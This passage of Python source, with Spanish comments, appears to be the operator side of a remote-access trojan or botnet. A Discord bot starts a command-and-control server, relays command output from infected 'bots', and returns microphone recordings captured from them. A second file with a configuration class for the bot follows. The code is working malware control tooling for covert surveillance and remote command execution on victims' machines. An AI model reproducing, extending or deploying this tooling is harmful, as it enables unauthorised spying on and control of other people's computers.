        if response.status_code == 200:
            data = response.json()
            if data["audio"]:
                # Convertir base64 a archivo
                audio_data = base64.b64decode(data["audio"])
                file = discord.File(
                    io.BytesIO(audio_data),
                    filename=f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                )
                await interaction.followup.send("🎵 Grabación completada:", file=file)
            else:
                await interaction.followup.send("❌ Error grabando audio")
        else:
            await interaction.followup.send("❌ Error accediendo al micrófono")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Función auxiliar para procesar respuestas
async def procesar_respuesta(interaction, response):
    """Procesa y formatea las respuestas de la API."""
    try:
        if response.status_code == 200:
            data = response.json()
            if "error" in data:
                await interaction.followup.send(f"❌ Error del servidor: {data['error']}")
                return
                
            if "message" in data:
                await interaction.followup.send(data["message"])
                return
                
            if "respuestas" in data:
                if not data["respuestas"]:
                    await interaction.followup.send("⚠️ No se recibió ninguna respuesta")
                    return
                    
                for bot_id, respuesta in data["respuestas"].items():
                    if not respuesta:
                        continue
                        
                    # Si es un mensaje de timeout o error
                    if respuesta.startswith(("Timeout:", "Error:")):
                        await interaction.followup.send(f"⚠️ **Bot {bot_id}**: {respuesta}")
                        continue
                        
                    # Dividir respuestas largas
                    if len(respuesta) > 1900:
                        partes = [respuesta[i:i+1900] for i in range(0, len(respuesta), 1900)]
                        for i, parte in enumerate(partes, 1):
                            await interaction.followup.send(
                                f"📟 **Bot {bot_id} (Parte {i}/{len(partes)}):**\n```\n{parte}\n```"
                            )
                    else:
                        await interaction.followup.send(
                            f"📟 **Bot {bot_id}:**\n```\n{respuesta}\n```"
                        )
            else:
                await interaction.followup.send("✅ Comando procesado pero sin respuesta")
        else:
            await interaction.followup.send(f"❌ Error HTTP: {response.status_code}")
            
    except Exception as e:
        logging.error(f"Error procesando respuesta: {e}")
        await interaction.followup.send(f"❌ Error procesando respuesta: {str(e)}")

# Modificar todas las funciones que hacen peticiones HTTP para aumentar el timeout
def make_request(method, url, **kwargs):
    """Wrapper para hacer peticiones HTTP con timeout aumentado."""
    kwargs.setdefault('timeout', 40)  # Timeout de 40 segundos
    return requests.request(method, url, **kwargs)

def configurar_entorno():
    """Configura el entorno de ejecución."""
    # Silenciar advertencias no críticas
    import warnings
    warnings.filterwarnings("ignore", category=Warning)
    
    # Configurar logging más limpio para discord
    discord_logger = logging.getLogger('discord')
    discord_logger.setLevel(logging.ERROR)
    werkzeug_logger = logging.getLogger('werkzeug')
    werkzeug_logger.setLevel(logging.ERROR)
    
    # Configurar logging del bot
    log_format = "%(asctime)s [%(levelname)s] %(message)s"
    logging.basicConfig(
        level=logging.INFO,
        format=log_format,
        handlers=[
            logging.FileHandler(os.path.join(os.path.dirname(__file__), "..", "logs", "discord_bot.log"), encoding="utf-8"),
            logging.StreamHandler()
        ]
    )

def iniciar_servidor():
    """Inicia el servidor API y CnC en procesos separados"""
    try:
        api_server_path = os.path.join(os.path.dirname(__file__), "api_server.py")
        
        print("\n[*] Iniciando servidor API y C&C...")
        
        process = subprocess.Popen(
            [sys.executable, api_server_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        def mostrar_salida(pipe, prefix):
            for line in iter(pipe.readline, ''):
                # Filtrar mensajes que no queremos mostrar
                if any(skip in line.lower() for skip in [
                    "press ctrl+c",
                    "debug mode",
                    "development server",
                    "running on",
                    "restarting with"
                ]):
                    continue
                    
                # Convertir mensajes INFO a formato normal
                if "INFO - " in line:
                    line = line.replace("INFO - ", "")
                    if "127.0.0.1" in line:  # Ignorar logs de acceso HTTP
                        continue
                    print(f"{prefix}: {line.strip()}")
                # Solo mostrar errores reales
                elif "ERROR - " in line:
                    print(f"{prefix} ERROR: {line.strip()}")
            
        threading.Thread(target=mostrar_salida, args=(process.stdout, "API"), daemon=True).start()
        threading.Thread(target=mostrar_salida, args=(process.stderr, "API"), daemon=True).start()
        
        print("[*] Esperando a que el servidor esté listo...")
        intentos = 0
        while intentos < 10:
            try:
                response = requests.get("http://127.0.0.1:5000/listar_bots")
                if response.status_code == 200:
                    print("[+] Servidor API iniciado correctamente")
                    return process
            except requests.exceptions.ConnectionError:
                intentos += 1
                time.sleep(1)
            except Exception as e:
                print(f"[-] Error inesperado: {e}")
                break
        
        if intentos >= 10:
            print("[-] Error: No se pudo iniciar el servidor API")
            process.kill()
            sys.exit(1)

    except Exception as e:
        logging.error(f"Error al iniciar el servidor: {e}")
        print(f"[-] Error crítico: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        configurar_entorno()
        
        # Cargar configuraciones
        config_bot = configparser.ConfigParser()
        config_bot.read(os.path.join(os.path.dirname(__file__), "..", "config", "config_bot.ini"))
        if not config_bot.has_section('DISCORD'):
            raise ValueError("No section: 'DISCORD' in the configuration file")

        # Iniciar el servidor API
        api_process = iniciar_servidor()

        try:
            print("\n[*] Iniciando bot de Discord...")
            print("[*] Usa Ctrl+C para detener el bot")
            # Iniciar el bot de Discord
            bot.run(config_bot.get("DISCORD", "BOT_TOKEN"))
        finally:
            # Asegurar que el servidor API se cierre cuando el bot se detenga
            if api_process:
                api_process.terminate()
                api_process.wait()
                print("[+] Servidor API cerrado correctamente")

    except Exception as e:
        logging.error(f"Error en la ejecución principal: {e}")
        print(f"[-] Error crítico: {e}")
        sys.exit(1)

import configparser
import os

class DiscordBot:
    def __init__(self):
        self.config = self.cargar_configuracion()
        self.bot_config = self.cargar_configuracion_bot()
        
        # Configurar el bot con los valores del config
        self.TOKEN = self.bot_config.get("DISCORD", "BOT_TOKEN")
        self.WEBHOOK_URL = self.bot_config.get("DISCORD", "WEBHOOK_URL")
        self.PREFIX = self.bot_config.get("DISCORD", "COMMAND_PREFIX")
        
        # Configurar límites de uso
        self.rate_limit = {
            "commands": self.bot_config.getint("RATE_LIMITING", "COMMANDS_PER_MINUTE"),
            "messages": self.bot_config.getint("RATE_LIMITING", "MESSAGES_PER_MINUTE"),
            "cooldown": self.bot_config.getint("RATE_LIMITING", "COOLDOWN_DURATION")
        }
        
        # Configurar canales
        self.channels = {
            "notification": self.bot_config.getint("DISCORD", "NOTIFICATION_CHANNEL_ID"),
            "error": self.bot_config.getint("DISCORD", "ERROR_CHANNEL_ID"),
            "log": self.bot_config.getint("DISCORD", "LOG_CHANNEL_ID")
        }
        
        # Configurar colores de embeds
        self.colors = {
            "success": self.bot_config.getint("NOTIFICATIONS", "EMBED_COLOR_SUCCESS"),
            "error": self.bot_config.getint("NOTIFICATIONS", "EMBED_COLOR_ERROR"),
            "info": self.bot_config.getint("NOTIFICATIONS", "EMBED_COLOR_INFO")
        }
        
    @staticmethod
    def cargar_configuracion():
        config = configparser.ConfigParser()
        config.read(os.path.join(os.path.dirname(__file__), "..", "config", "config.ini"))
        return config
        
    @staticmethod
    def cargar_configuracion_bot():
        config = configparser.ConfigParser()
        config.read(os.path.join(os.path.dirname(__file__), "..", "config", "config_bot.ini"))
        return config